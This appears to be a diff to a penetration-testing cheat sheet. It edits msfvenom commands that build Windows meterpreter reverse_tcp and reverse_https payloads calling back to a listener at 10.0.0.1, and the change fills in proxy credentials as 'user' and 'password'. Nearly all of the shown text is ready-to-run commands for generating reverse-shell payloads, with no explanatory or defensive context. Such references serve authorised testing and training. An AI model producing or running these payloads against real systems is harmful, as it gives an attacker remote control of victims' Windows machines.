@@ -9,7 +9,7 @@ msfvenom --platform Windows -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LP
 
 ##### Reverse HTTPS with proxy authentication:
 ```
-msfvenom --platform Windows -p windows/meterpreter/reverse_https HttpProxyUser=* HttpProxyPass=* LHOST=10.0.0.1 LPORT=443 -b 
+msfvenom --platform Windows -p windows/meterpreter/reverse_https HttpProxyUser=user HttpProxyPass=password LHOST=10.0.0.1 LPORT=443 -b 
 ```
 
 ##### MSF Console:
